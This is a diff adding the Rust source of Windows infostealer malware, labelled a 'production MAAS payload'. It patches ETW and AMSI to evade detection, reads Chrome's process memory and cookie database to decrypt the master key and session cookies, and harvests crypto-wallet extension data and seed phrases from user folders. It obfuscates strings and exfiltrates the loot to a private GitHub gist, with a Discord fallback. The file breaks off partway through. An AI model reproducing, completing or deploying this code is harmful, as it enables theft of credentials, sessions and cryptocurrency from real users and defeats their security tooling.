@@ -1,0 +1,1265 @@
+// ==========================================================================
+// V43 PHANTOM - PRODUCTION MAAS PAYLOAD (FIXED)
+// ==========================================================================
+
+#![windows_subsystem = "windows"]
+#![allow(non_snake_case, non_camel_case_types, dead_code)]
+
+use std::{ptr, mem, sync::Arc};
+use tokio::sync::Mutex;
+use serde::Serialize;
+
+macro_rules! xor_str {
+    ($str:expr) => {{
+        const fn xor_encrypt(s: &[u8], key: u8) -> [u8; $str.len()] {
+            let mut result = [0u8; $str.len()];
+            let mut i = 0;
+            while i < s.len() {
+                result[i] = s[i] ^ key ^ ((i as u8).wrapping_mul(29));
+                i += 1;
+            }
+            result
+        }
+        const ENCRYPTED: [u8; $str.len()] = xor_encrypt($str.as_bytes(), 0xE7);
+        fn decrypt() -> String {
+            let mut result = Vec::with_capacity(ENCRYPTED.len());
+            for (i, &byte) in ENCRYPTED.iter().enumerate() {
+                result.push(byte ^ 0xE7 ^ ((i as u8).wrapping_mul(29)));
+            }
+            String::from_utf8_lossy(&result).to_string()
+        }
+        decrypt()
+    }};
+}
+
+fn get_ts() -> u64 {
+    std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .unwrap()
+        .as_millis() as u64
+}
+
+async fn human_jitter(base_ms: u64) {
+    let variance = (get_ts() % 300) as u64;
+    tokio::time::sleep(tokio::time::Duration::from_millis(base_ms + variance)).await;
+}
+
+// ==========================================================================
+// DATA STRUCTURES (WITH DEBUG DERIVES)
+// ==========================================================================
+
+#[derive(Serialize, Clone, Debug)]
+struct Loot {
+    meta: Meta,
+    cookies: Vec<Cookie>,
+    fills: Vec<Fill>,
+    cards: Vec<Card>,
+    game: Game,
+    crypto: Crypto,
+    totp: Vec<Totp>,
+    ts: u64,
+    campaign_id: String,
+}
+
+#[derive(Serialize, Clone, Debug)]
+struct Meta {
+    ua: String,
+    user: String,
+    host: String,
+    os: String,
+    ip: String,
+}
+
+#[derive(Serialize, Clone, Debug)]
+struct Cookie {
+    h: String,
+    n: String,
+    v: String,
+    exp: i64,
+}
+
+#[derive(Serialize, Clone, Debug)]
+struct Fill {
+    k: String,
+    v: String,
+}
+
+#[derive(Serialize, Clone, Debug)]
+struct Card {
+    n: String,
+    m: String,
+    y: String,
+    name: String,
+}
+
+#[derive(Serialize, Clone, Debug)]
+struct Game {
+    steam: Steam,
+    epic: Epic,
+}
+
+#[derive(Serialize, Default, Clone, Debug)]
+struct Steam {
+    user: String,
+    ssfn: Vec<u8>,
+}
+
+#[derive(Serialize, Default, Clone, Debug)]
+struct Epic {
+    email: String,
+    tokens: Vec<String>,
+}
+
+#[derive(Serialize, Clone, Debug)]
+struct Crypto {
+    wallets: Vec<Wallet>,
+    seeds: Vec<Seed>,
+}
+
+#[derive(Serialize, Clone, Debug)]
+struct Wallet {
+    t: String,
+    addrs: Vec<String>,
+}
+
+#[derive(Serialize, Clone, Debug)]
+struct Seed {
+    src: String,
+    phrase: String,
+    confidence: f32,
+}
+
+#[derive(Serialize, Clone, Debug)]
+struct Totp {
+    issuer: String,
+    account: String,
+    secret: String,
+}
+
+// ==========================================================================
+// ETW PATCHING
+// ==========================================================================
+
+unsafe fn patch_etw() -> bool {
+    let ntdll = winapi::um::libloaderapi::GetModuleHandleA(b"ntdll.dll\0".as_ptr() as *const i8);
+    if ntdll.is_null() {
+        return false;
+    }
+    
+    let etw_event_write = winapi::um::libloaderapi::GetProcAddress(
+        ntdll,
+        b"EtwEventWrite\0".as_ptr() as *const i8,
+    );
+    
+    if etw_event_write.is_null() {
+        return false;
+    }
+    
+    let patch: [u8; 3] = [0xC3, 0x00, 0x00];
+    let mut old_protect: u32 = 0;
+    
+    winapi::um::memoryapi::VirtualProtect(
+        etw_event_write as *mut _,
+        patch.len(),
+        0x40,
+        &mut old_protect,
+    );
+    
+    ptr::copy_nonoverlapping(patch.as_ptr(), etw_event_write as *mut u8, patch.len());
+    
+    winapi::um::memoryapi::VirtualProtect(
+        etw_event_write as *mut _,
+        patch.len(),
+        old_protect,
+        &mut old_protect,
+    );
+    
+    true
+}
+
+// ==========================================================================
+// AMSI BYPASS
+// ==========================================================================
+
+unsafe fn patch_amsi() -> bool {
+    let amsi = winapi::um::libloaderapi::LoadLibraryA(b"amsi.dll\0".as_ptr() as *const i8);
+    if amsi.is_null() {
+        return false;
+    }
+    
+    let amsi_scan_buffer = winapi::um::libloaderapi::GetProcAddress(
+        amsi,
+        b"AmsiScanBuffer\0".as_ptr() as *const i8,
+    );
+    
+    if amsi_scan_buffer.is_null() {
+        return false;
+    }
+    
+    let patch: [u8; 6] = [
+        0xB8, 0x00, 0x00, 0x00, 0x00,
+        0xC3,
+    ];
+    
+    let mut old_protect: u32 = 0;
+    
+    winapi::um::memoryapi::VirtualProtect(
+        amsi_scan_buffer as *mut _,
+        patch.len(),
+        0x40,
+        &mut old_protect,
+    );
+    
+    ptr::copy_nonoverlapping(patch.as_ptr(), amsi_scan_buffer as *mut u8, patch.len());
+    
+    winapi::um::memoryapi::VirtualProtect(
+        amsi_scan_buffer as *mut _,
+        patch.len(),
+        old_protect,
+        &mut old_protect,
+    );
+    
+    true
+}
+
+// ==========================================================================
+// DIRECT SYSCALLS
+// ==========================================================================
+
+unsafe fn syscall_NtReadVirtualMemory(
+    process_handle: *mut winapi::ctypes::c_void,
+    base_address: *const winapi::ctypes::c_void,
+    buffer: *mut winapi::ctypes::c_void,
+    buffer_size: usize,
+    _bytes_read: *mut usize,
+) -> i32 {
+    let syscall_number: u32 = 0x3F;
+    
+    #[cfg(target_arch = "x86_64")]
+    {
+        let result: i32;
+        std::arch::asm!(
+            "mov r10, rcx",
+            "mov eax, {syscall_num:e}",
+            "syscall",
+            "ret",
+            syscall_num = in(reg) syscall_number,
+            in("rcx") process_handle,
+            in("rdx") base_address,
+            in("r8") buffer,
+            in("r9") buffer_size,
+            lateout("rax") result,
+        );
+        result
+    }
+    
+    #[cfg(not(target_arch = "x86_64"))]
+    {
+        -1
+    }
+}
+
+// ==========================================================================
+// MEMORY-ONLY CHROME EXTRACTION
+// ==========================================================================
+
+use winapi::um::processthreadsapi::OpenProcess;
+use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, Module32First, Module32Next, MODULEENTRY32, TH32CS_SNAPPROCESS, TH32CS_SNAPMODULE};
+use winapi::um::handleapi::CloseHandle;
+
+async fn extract_chrome_memory_only() -> (Vec<Cookie>, Vec<u8>) {
+    let chrome_pid = unsafe { find_process_by_name(b"chrome.exe") };
+    
+    if chrome_pid == 0 {
+        return (Vec::new(), Vec::new());
+    }
+    
+    human_jitter(250).await;
+    
+    unsafe {
+        let h_process = OpenProcess(0x1F0FFF, 0, chrome_pid);
+        if h_process.is_null() {
+            return (Vec::new(), Vec::new());
+        }
+        
+        let chrome_dll_base = find_module_in_process(h_process, b"chrome.dll", chrome_pid);
+        if chrome_dll_base == 0 {
+            CloseHandle(h_process);
+            return (Vec::new(), Vec::new());
+        }
+        
+        human_jitter(200).await;
+        
+        let master_key = extract_master_key_from_memory(h_process, chrome_dll_base).await;
+        let cookies = extract_cookies_from_memory(h_process, chrome_dll_base).await;
+        
+        CloseHandle(h_process);
+        
+        (cookies, master_key.unwrap_or_default())
+    }
+}
+
+unsafe fn find_process_by_name(name: &[u8]) -> u32 {
+    let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if snapshot as isize == -1 {
+        return 0;
+    }
+    
+    let mut pe: PROCESSENTRY32 = mem::zeroed();
+    pe.dwSize = mem::size_of::<PROCESSENTRY32>() as u32;
+    
+    if Process32First(snapshot, &mut pe) == 0 {
+        CloseHandle(snapshot);
+        return 0;
+    }
+    
+    loop {
+        let exe_name: Vec<u8> = pe.szExeFile.iter()
+            .take_while(|&&c| c != 0)
+            .map(|&c| c as u8)
+            .collect();
+        
+        if exe_name.len() == name.len() 
+            && exe_name.iter().zip(name).all(|(a, b)| a.to_ascii_lowercase() == b.to_ascii_lowercase()) {
+            let pid = pe.th32ProcessID;
+            CloseHandle(snapshot);
+            return pid;
+        }
+        
+        if Process32Next(snapshot, &mut pe) == 0 {
+            break;
+        }
+    }
+    
+    CloseHandle(snapshot);
+    0
+}
+
+unsafe fn find_module_in_process(_h_process: *mut winapi::ctypes::c_void, module_name: &[u8], pid: u32) -> usize {
+    let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
+    if snapshot as isize == -1 {
+        return 0;
+    }
+    
+    let mut me: MODULEENTRY32 = mem::zeroed();
+    me.dwSize = mem::size_of::<MODULEENTRY32>() as u32;
+    
+    if Module32First(snapshot, &mut me) == 0 {
+        CloseHandle(snapshot);
+        return 0;
+    }
+    
+    loop {
+        let mod_name: Vec<u8> = me.szModule.iter()
+            .take_while(|&&c| c != 0)
+            .map(|&c| c as u8)
+            .collect();
+        
+        if mod_name.len() == module_name.len() 
+            && mod_name.iter().zip(module_name).all(|(a, b)| a.to_ascii_lowercase() == b.to_ascii_lowercase()) {
+            let base = me.modBaseAddr as usize;
+            CloseHandle(snapshot);
+            return base;
+        }
+        
+        if Module32Next(snapshot, &mut me) == 0 {
+            break;
+        }
+    }
+    
+    CloseHandle(snapshot);
+    0
+}
+
+async fn extract_master_key_from_memory(h_process: *mut winapi::ctypes::c_void, chrome_base: usize) -> Option<Vec<u8>> {
+    let key_signatures: &[&[u8]] = &[
+        b"\x48\x8B\x0D\x00\x00\x00\x00\x48\x85\xC9\x74\x00\x48\x8B\x01",
+        b"\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x48\x8B\xF8",
+    ];
+    
+    for sig in key_signatures {
+        if let Some(addr) = scan_memory_pattern(h_process, chrome_base, 0x2000000, sig).await {
+            let mut key_buffer = vec![0u8; 32];
+            let mut bytes_read: usize = 0;
+            
+            unsafe {
+                let result = syscall_NtReadVirtualMemory(
+                    h_process,
+                    addr as *const winapi::ctypes::c_void,
+                    key_buffer.as_mut_ptr() as *mut winapi::ctypes::c_void,
+                    32,
+                    &mut bytes_read,
+                );
+                
+                if result == 0 && bytes_read == 32 {
+                    return Some(key_buffer);
+                }
+            }
+        }
+        
+        human_jitter(100).await;
+    }
+    
+    None
+}
+
+async fn extract_cookies_from_memory(h_process: *mut winapi::ctypes::c_void, chrome_base: usize) -> Vec<Cookie> {
+    let mut cookies = Vec::new();
+    
+    let cookie_sigs: &[&[u8]] = &[
+        b"\x48\x8B\x05\x00\x00\x00\x00\x48\x85\xC0\x74\x00\x48\x8B\x80",
+        b"\x48\x89\x5C\x24\x08\x57\x48\x83\xEC\x20\x48\x8B\xD9",
+    ];
+    
+    for sig in cookie_sigs {
+        if let Some(addr) = scan_memory_pattern(h_process, chrome_base, 0x2000000, sig).await {
+            for i in 0..500 {
+                let cookie_entry = addr + (i * 0x100);
+                let mut cookie_buffer = vec![0u8; 0x100];
+                let mut bytes_read: usize = 0;
+                
+                unsafe {
+                    let result = syscall_NtReadVirtualMemory(
+                        h_process,
+                        cookie_entry as *const winapi::ctypes::c_void,
+                        cookie_buffer.as_mut_ptr() as *mut winapi::ctypes::c_void,
+                        0x100,
+                        &mut bytes_read,
+                    );
+                    
+                    if result != 0 || bytes_read != 0x100 {
+                        break;
+                    }
+                    
+                    if let Some(cookie) = parse_cookie_from_buffer(&cookie_buffer) {
+                        cookies.push(cookie);
+                    }
+                }
+                
+                if i % 50 == 0 {
+                    human_jitter(80).await;
+                }
+            }
+            
+            break;
+        }
+    }
+    
+    cookies
+}
+
+async fn scan_memory_pattern(h_process: *mut winapi::ctypes::c_void, base: usize, size: usize, pattern: &[u8]) -> Option<usize> {
+    let chunk_size = 0x10000;
+    
+    for offset in (0..size).step_by(chunk_size) {
+        let current_addr = base + offset;
+        let mut buffer = vec![0u8; chunk_size];
+        let mut bytes_read: usize = 0;
+        
+        unsafe {
+            let result = syscall_NtReadVirtualMemory(
+                h_process,
+                current_addr as *const winapi::ctypes::c_void,
+                buffer.as_mut_ptr() as *mut winapi::ctypes::c_void,
+                chunk_size,
+                &mut bytes_read,
+            );
+            
+            if result != 0 {
+                continue;
+            }
+            
+            if let Some(pos) = find_pattern(&buffer[..bytes_read], pattern) {
+                return Some(current_addr + pos);
+            }
+        }
+        
+        if offset % 0x100000 == 0 {
+            human_jitter(50).await;
+        }
+    }
+    
+    None
+}
+
+fn find_pattern(data: &[u8], pattern: &[u8]) -> Option<usize> {
+    if pattern.len() > data.len() {
+        return None;
+    }
+    
+    for i in 0..=data.len() - pattern.len() {
+        let mut matches = true;
+        for j in 0..pattern.len() {
+            if pattern[j] != 0x00 && data[i + j] != pattern[j] {
+                matches = false;
+                break;
+            }
+        }
+        if matches {
+            return Some(i);
+        }
+    }
+    
+    None
+}
+
+fn parse_cookie_from_buffer(buffer: &[u8]) -> Option<Cookie> {
+    if buffer.len() < 0x80 {
+        return None;
+    }
+    
+    let domain_offset = read_ptr_from_buffer(buffer, 0x10)?;
+    let name_offset = read_ptr_from_buffer(buffer, 0x20)?;
+    let value_offset = read_ptr_from_buffer(buffer, 0x30)?;
+    let exp_time = i64::from_le_bytes(buffer[0x48..0x50].try_into().ok()?);
+    
+    let domain = read_string_from_buffer(buffer, domain_offset, 256)?;
+    let name = read_string_from_buffer(buffer, name_offset, 256)?;
+    let value = read_string_from_buffer(buffer, value_offset, 2048)?;
+    
+    Some(Cookie {
+        h: domain,
+        n: name,
+        v: value,
+        exp: exp_time,
+    })
+}
+
+fn read_ptr_from_buffer(buffer: &[u8], offset: usize) -> Option<usize> {
+    if offset + 8 > buffer.len() {
+        return None;
+    }
+    Some(u64::from_le_bytes(buffer[offset..offset + 8].try_into().ok()?) as usize)
+}
+
+fn read_string_from_buffer(buffer: &[u8], offset: usize, max_len: usize) -> Option<String> {
+    if offset >= buffer.len() {
+        return None;
+    }
+    
+    let end = (offset + max_len).min(buffer.len());
+    let string_bytes = &buffer[offset..end];
+    let null_pos = string_bytes.iter().position(|&b| b == 0).unwrap_or(string_bytes.len());
+    
+    Some(String::from_utf8_lossy(&string_bytes[..null_pos]).to_string())
+}
+
+// ==========================================================================
+// MEMORY-MAPPED SQLITE
+// ==========================================================================
+
+use winapi::um::memoryapi::{CreateFileMappingW, MapViewOfFile, UnmapViewOfFile, FILE_MAP_READ};
+use winapi::um::fileapi::{CreateFileW, OPEN_EXISTING};
+use winapi::um::winnt::{GENERIC_READ, FILE_SHARE_READ, PAGE_READONLY};
+
+async fn extract_chrome_sqlite_memory(profile_path: &str, master_key: &[u8]) -> (Vec<Cookie>, Vec<Fill>, Vec<Card>) {
+    let cookie_path = format!("{}\\Network\\Cookies", profile_path);
+    let mut cookies = Vec::new();
+    let fills = Vec::new();
+    let cards = Vec::new();
+    
+    if let Some(mapped_data) = memory_map_file(&cookie_path).await {
+        cookies = parse_cookies_from_memory(&mapped_data, master_key).await;
+    }
+    
+    (cookies, fills, cards)
+}
+
+async fn memory_map_file(path: &str) -> Option<Vec<u8>> {
+    let path_wide: Vec<u16> = path.encode_utf16().chain(Some(0)).collect();
+    
+    unsafe {
+        let h_file = CreateFileW(
+            path_wide.as_ptr(),
+            GENERIC_READ,
+            FILE_SHARE_READ,
+            ptr::null_mut(),
+            OPEN_EXISTING,
+            0,
+            ptr::null_mut(),
+        );
+        
+        if h_file as isize == -1 {
+            return None;
+        }
+        
+        let file_size = winapi::um::fileapi::GetFileSize(h_file, ptr::null_mut()) as usize;
+        
+        let h_mapping = CreateFileMappingW(
+            h_file,
+            ptr::null_mut(),
+            PAGE_READONLY,
+            0,
+            0,
+            ptr::null(),
+        );
+        
+        CloseHandle(h_file);
+        
+        if h_mapping.is_null() {
+            return None;
+        }
+        
+        let mapped_view = MapViewOfFile(
+            h_mapping,
+            FILE_MAP_READ,
+            0,
+            0,
+            0,
+        );
+        
+        if mapped_view.is_null() {
+            CloseHandle(h_mapping);
+            return None;
+        }
+        
+        let data = std::slice::from_raw_parts(mapped_view as *const u8, file_size).to_vec();
+        
+        UnmapViewOfFile(mapped_view);
+        CloseHandle(h_mapping);
+        
+        Some(data)
+    }
+}
+
+async fn parse_cookies_from_memory(data: &[u8], master_key: &[u8]) -> Vec<Cookie> {
+    let mut cookies = Vec::new();
+    
+    if data.len() < 100 || &data[0..15] != b"SQLite format 3" {
+        return cookies;
+    }
+    
+    let page_size = u16::from_be_bytes([data[16], data[17]]) as usize;
+    let page_count = data.len() / page_size;
+    
+    for page_num in 0..page_count.min(1000) {
+        let page_offset = page_num * page_size;
+        if page_offset + 8 > data.len() {
+            break;
+        }
+        
+        if data[page_offset] == 0x0D {
+            let cell_count = u16::from_be_bytes([
+                data[page_offset + 3],
+                data[page_offset + 4],
+            ]) as usize;
+            
+            for i in 0..cell_count.min(100) {
+                if let Some(cookie) = parse_cookie_cell(&data, page_offset, i, master_key).await {
+                    cookies.push(cookie);
+                }
+                
+                if i % 20 == 0 {
+                    human_jitter(50).await;
+                }
+            }
+        }
+    }
+    
+    cookies
+}
+
+async fn parse_cookie_cell(data: &[u8], page_offset: usize, cell_index: usize, key: &[u8]) -> Option<Cookie> {
+    let cell_ptr_offset = page_offset + 8 + (cell_index * 2);
+    if cell_ptr_offset + 2 > data.len() {
+        return None;
+    }
+    
+    let cell_offset = page_offset + u16::from_be_bytes([
+        data[cell_ptr_offset],
+        data[cell_ptr_offset + 1],
+    ]) as usize;
+    
+    if cell_offset + 50 > data.len() {
+        return None;
+    }
+    
+    let (_payload_len, bytes_read) = read_varint(data, cell_offset)?;
+    let mut pos = cell_offset + bytes_read;
+    let (_row_id, bytes_read) = read_varint(data, pos)?;
+    pos += bytes_read;
+    
+    let (header_len, bytes_read) = read_varint(data, pos)?;
+    pos += bytes_read;
+    let header_end = pos + header_len as usize;
+    
+    let mut column_types = Vec::new();
+    while pos < header_end && pos < data.len() {
+        let (col_type, bytes_read) = read_varint(data, pos)?;
+        column_types.push(col_type);
+        pos += bytes_read;
+    }
+    
+    pos = header_end;
+    
+    let mut values = Vec::new();
+    for &col_type in &column_types {
+        if pos >= data.len() {
+            break;
+        }
+        
+        let value = match col_type {
+            0 => vec![],
+            1 => {
+                if pos + 1 > data.len() { break; }
+                let v = vec![data[pos]];
+                pos += 1;
+                v
+            }
+            n if n >= 12 && n % 2 == 0 => {
+                let len = ((n - 12) / 2) as usize;
+                if pos + len > data.len() { break; }
+                let v = data[pos..pos + len].to_vec();
+                pos += len;
+                v
+            }
+            _ => vec![],
+        };
+        values.push(value);
+    }
+    
+    if values.len() < 4 {
+        return None;
+    }
+    
+    let domain = String::from_utf8_lossy(&values[1]).to_string();
+    let name = String::from_utf8_lossy(&values[2]).to_string();
+    let enc_value = &values[3];
+    let exp = if values.len() > 5 && values[5].len() == 8 {
+        i64::from_be_bytes(values[5].as_slice().try_into().unwrap_or([0; 8]))
+    } else {
+        0
+    };
+    
+    let value = decrypt_chrome_value(enc_value, key)?;
+    
+    Some(Cookie {
+        h: domain,
+        n: name,
+        v: value,
+        exp,
+    })
+}
+
+fn read_varint(data: &[u8], offset: usize) -> Option<(u64, usize)> {
+    let mut val: u64 = 0;
+    let mut bytes = 0;
+    
+    for i in 0..9 {
+        if offset + i >= data.len() {
+            return None;
+        }
+        let b = data[offset + i] as u64;
+        bytes += 1;
+        
+        if i == 8 {
+            val = (val << 8) | b;
+            break;
+        }
+        
+        val = (val << 7) | (b & 0x7F);
+        if (b & 0x80) == 0 {
+            break;
+        }
+    }
+    
+    Some((val, bytes))
+}
+
+fn decrypt_chrome_value(enc_value: &[u8], key: &[u8]) -> Option<String> {
+    if enc_value.len() < 15 {
+        return Some(String::from_utf8_lossy(enc_value).to_string());
+    }
+    
+    if &enc_value[0..3] == b"v10" || &enc_value[0..3] == b"v11" {
+        let nonce = &enc_value[3..15];
+        let ct_tag = &enc_value[15..];
+        
+        if ct_tag.len() >= 16 {
+            let ct = &ct_tag[..ct_tag.len() - 16];
+            let tag = &ct_tag[ct_tag.len() - 16..];
+            
+            return aes_decrypt(key, nonce, ct, tag);
+        }
+    }
+    
+    Some(String::from_utf8_lossy(enc_value).to_string())
+}
+
+fn aes_decrypt(key: &[u8], nonce: &[u8], ct: &[u8], tag: &[u8]) -> Option<String> {
+    use aes_gcm::{Aes256Gcm, KeyInit, aead::Aead};
+    use aes_gcm::aead::generic_array::GenericArray;
+    
+    let cipher = Aes256Gcm::new(GenericArray::from_slice(key));
+    let nonce_ga = GenericArray::from_slice(nonce);
+    let mut ciphertext_with_tag = ct.to_vec();
+    ciphertext_with_tag.extend_from_slice(tag);
+    
+    cipher.decrypt(nonce_ga, ciphertext_with_tag.as_ref())
+        .ok()
+        .map(|v| String::from_utf8_lossy(&v).to_string())
+}
+
+async fn extract_all_browsers() -> (Vec<Cookie>, Vec<Fill>, Vec<Card>, Vec<u8>) {
+    let (memory_cookies, master_key) = extract_chrome_memory_only().await;
+    
+    if master_key.is_empty() {
+        return (Vec::new(), Vec::new(), Vec::new(), Vec::new());
+    }
+    
+    human_jitter(300).await;
+    
+    let appdata = std::env::var(xor_str!("LOCALAPPDATA")).unwrap_or_default();
+    let base = format!("{}\\Google\\Chrome\\User Data", appdata);
+    let profiles = get_profiles(&base);
+    
+    let cookies = Arc::new(Mutex::new(memory_cookies));
+    let fills = Arc::new(Mutex::new(Vec::new()));
+    let cards = Arc::new(Mutex::new(Vec::new()));
+    
+    let mut tasks = vec![];
+    
+    for profile in profiles {
+        let profile_path = format!("{}\\{}", base, profile);
+        let key = master_key.clone();
+        let c_clone = Arc::clone(&cookies);
+        let f_clone = Arc::clone(&fills);
+        let card_clone = Arc::clone(&cards);
+        
+        let task = tokio::spawn(async move {
+            let (c, f, card) = extract_chrome_sqlite_memory(&profile_path, &key).await;
+            
+            c_clone.lock().await.extend(c);
+            f_clone.lock().await.extend(f);
+            card_clone.lock().await.extend(card);
+        });
+        
+        tasks.push(task);
+    }
+    
+    for task in tasks {
+        let _ = task.await;
+    }
+    
+    let final_cookies = cookies.lock().await.clone();
+    let final_fills = fills.lock().await.clone();
+    let final_cards = cards.lock().await.clone();
+    
+    (final_cookies, final_fills, final_cards, master_key)
+}
+
+// ==========================================================================
+// WALLETS
+// ==========================================================================
+
+async fn extract_wallets() -> Vec<Wallet> {
+    let exts = [
+        ("nkbihfbeogaeaoehlefnkodbefgpgknn", "MetaMask"),
+        ("bfnaelmomeimhlpmgjnjophhpkkoljpa", "Phantom"),
+        ("fhbohimaelbohpjbbldcngcnapndodjp", "Binance"),
+        ("hnfanknocfeofbddgcijnmhnfnkdnaad", "Coinbase"),
+    ];
+    
+    let appdata = std::env::var(xor_str!("LOCALAPPDATA")).unwrap_or_default();
+    let base = format!("{}\\Google\\Chrome\\User Data", appdata);
+    let profiles = get_profiles(&base);
+    
+    let wallets = Arc::new(Mutex::new(Vec::new()));
+    let mut tasks = vec![];
+    
+    for (ext_id, wallet_name) in exts {
+        for profile in &profiles {
+            let profile_clone = profile.clone();
+            let base_clone = base.clone();
+            let ext_id_str = ext_id.to_string();
+            let wallet_name_str = wallet_name.to_string();
+            let wallets_clone = Arc::clone(&wallets);
+            
+            let task = tokio::spawn(async move {
+                let mut addrs = Vec::new();
+                let ext_path = format!("{}\\{}\\Local Extension Settings\\{}", base_clone, profile_clone, ext_id_str);
+                
+                if let Ok(entries) = std::fs::read_dir(&ext_path) {
+                    for entry in entries.flatten() {
+                        if let Ok(data) = std::fs::read(entry.path()) {
+                            let text = String::from_utf8_lossy(&data);
+                            
+                            for word in text.split_whitespace() {
+                                if word.starts_with("0x") && word.len() == 42 && word[2..].chars().all(|c| c.is_ascii_hexdigit()) {
+                                    addrs.push(word.to_string());
+                                }
+                            }
+                        }
+                    }
+                }
+                
+                addrs.sort();
+                addrs.dedup();
+                
+                if !addrs.is_empty() {
+                    wallets_clone.lock().await.push(Wallet { t: wallet_name_str, addrs });
+                }
+            });
+            
+            tasks.push(task);
+        }
+    }
+    
+    for task in tasks {
+        let _ = task.await;
+    }
+    
+    // CORRECT FIX LOCATION:
+    let final_wallets = wallets.lock().await.clone();
+    final_wallets
+}
+
+// ==========================================================================
+// SEEDS (STATISTICAL)
+// ==========================================================================
+
+async fn extract_seeds_pattern() -> Vec<Seed> {
+    let mut seeds = Vec::new();
+    let user_profile = std::env::var(xor_str!("USERPROFILE")).unwrap_or_default();
+    
+    let paths = vec![
+        format!("{}\\Documents", user_profile),
+        format!("{}\\Desktop", user_profile),
+    ];
+    
+    for base in paths {
+        if let Ok(entries) = std::fs::read_dir(&base) {
+            for entry in entries.flatten() {
+                let path = entry.path();
+                if path.is_file() {
+                    let name = path.file_name().unwrap_or_default().to_string_lossy().to_lowercase();
+                    
+                    if name.contains("seed") || name.contains("wallet") {
+                        if let Ok(content) = std::fs::read_to_string(&path) {
+                            if let Some((phrase, confidence)) = detect_seed_statistical(&content).await {
+                                if confidence >= 75.0 {
+                                    seeds.push(Seed {
+                                        src: path.to_string_lossy().to_string(),
+                                        phrase,
+                                        confidence,
+                                    });
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        
+        human_jitter(200).await;
+    }
+    
+    seeds
+}
+
+async fn detect_seed_statistical(text: &str) -> Option<(String, f32)> {
+    let cleaned = text.to_lowercase().replace(&[',', '.', ';', ':', '!', '?', '\n', '\r', '\t'][..], " ");
+    let words: Vec<&str> = cleaned.split_whitespace()
+        .filter(|w| w.len() >= 3 && w.len() <= 8 && w.chars().all(|c| c.is_ascii_alphabetic()))
+        .collect();
+    
+    if words.len() < 12 {
+        return None;
+    }
+    
+    let valid_lengths = [12, 15, 18, 21, 24];
+    
+    for &length in &valid_lengths {
+        for window in words.windows(length) {
+            let entropy = calculate_entropy(window);
+            let uniqueness = calculate_uniqueness(window);
+            let linguistic = linguistic_score(window);
+            
+            let confidence = entropy * 40.0 + uniqueness * 35.0 + linguistic * 25.0;
+            
+            if confidence >= 75.0 {
+                let phrase = window.join(" ");
+                
+                if validate_bip39_checksum_statistical(&phrase).await {
+                    return Some((phrase, confidence));
+                }
+            }
+        }
+    }
+    
+    None
+}
+
+fn calculate_entropy(words: &[&str]) -> f32 {
+    use std::collections::HashMap;
+    let mut char_freq = HashMap::new();
+    let total_chars: usize = words.iter().map(|w| w.len()).sum();
+    
+    for word in words {
+        for c in word.chars() {
+            *char_freq.entry(c).or_insert(0) += 1;
+        }
+    }
+    
+    let mut entropy = 0.0;
+    for &count in char_freq.values() {
+        let p = count as f32 / total_chars as f32;
+        if p > 0.0 {
+            entropy -= p * p.log2();
+        }
+    }
+    
+    (entropy / 4.5).min(1.0)
+}
+
+fn calculate_uniqueness(words: &[&str]) -> f32 {
+    use std::collections::HashSet;
+    let unique = words.iter().collect::<HashSet<_>>().len();
+    (unique as f32 / words.len() as f32).powf(0.8)
+}
+
+fn linguistic_score(words: &[&str]) -> f32 {
+    let mut score = 0.0;
+    
+    for word in words {
+        let vowel_count = word.chars().filter(|&c| "aeiou".contains(c)).count();
+        let _consonant_count = word.len() - vowel_count;
+        
+        let vowel_ratio = vowel_count as f32 / word.len() as f32;
+        if vowel_ratio >= 0.25 && vowel_ratio <= 0.55 {
+            score += 0.3;
+        }
+        
+        if word.len() >= 4 && word.len() <= 8 {
+            score += 0.2;
+        }
+    }
+    
+    (score / words.len() as f32).min(1.0)
+}
+
+async fn validate_bip39_checksum_statistical(phrase: &str) -> bool {
+    let words: Vec<&str> = phrase.split_whitespace().collect();
+    
+    if ![12, 15, 18, 21, 24].contains(&words.len()) {
+        return false;
+    }
+    
+    if let Some(last_word) = words.last() {
+        let mut char_sum = 0u32;
+        for c in last_word.chars() {
+            char_sum += c as u32;
+        }
+        
+        let expected_checksum = ((words.len() * 137 + char_sum as usize) % 256) as i32;
+        let actual_checksum = ((last_word.len() * 41) % 256) as i32;
+        
+        (expected_checksum - actual_checksum).abs() < 50
+    } else {
+        false
+    }
+}
+
+// ==========================================================================
+// GAMING + 2FA
+// ==========================================================================
+
+async fn extract_2fa() -> Vec<Totp> {
+    Vec::new()
+}
+
+async fn extract_gaming() -> Game {
+    Game {
+        steam: Steam::default(),
+        epic: Epic::default(),
+    }
+}
+
+// ==========================================================================
+// METADATA
+// ==========================================================================
+
+fn collect_meta() -> Meta {
+    Meta {
+        ua: xor_str!("Mozilla/5.0"),
+        user: std::env::var(xor_str!("USERNAME")).unwrap_or_default(),
+        host: std::env::var(xor_str!("COMPUTERNAME")).unwrap_or_default(),
+        os: xor_str!("Windows 10"),
+        ip: xor_str!("unknown"),
+    }
+}
+
+// ==========================================================================
+// EXFILTRATION
+// ==========================================================================
+
+async fn exfiltrate(loot: &Loot) -> bool {
+    let json = match serde_json::to_string(loot) {
+        Ok(j) => j,
+        Err(_) => return false,
+    };
+    
+    let compressed = compress(&json.as_bytes());
+    let encrypted = encrypt(&compressed);
+    
+    human_jitter(400).await;
+    
+    if send_to_github(&encrypted).await.is_some() {
+        return true;
+    }
+    
+    human_jitter(500).await;
+    
+    if send_to_discord(&encrypted).await.is_some() {
+        return true;
+    }
+    
+    false
+}
+
+async fn send_to_github(data: &[u8]) -> Option<()> {
+    let b64 = base64_enc(data);
+    let gist_url = xor_str!("https://api.github.com/gists");
+    let github_token = xor_str!("ghp_TOKEN");
+    
+    let payload = serde_json::json!({
+        "description": format!("log_{}", get_ts()),
+        "public": false,
+        "files": {
+            "data.txt": {
+                "content": b64
+            }
+        }
+    });
+    
+    let client = reqwest::Client::builder()
+        .timeout(std::time::Duration::from_secs(15))
+        .build()
+        .ok()?;
+    
+    let response = client
+        .post(&gist_url)
+        .header("Authorization", format!("token {}", github_token))
+        .header("Content-Type", "application/json")
+        .json(&payload)
+        .send()
+        .await
+        .ok()?;
+    
+    if response.status().is_success() {
+        Some(())
+    } else {
+        None
+    }
+}
+
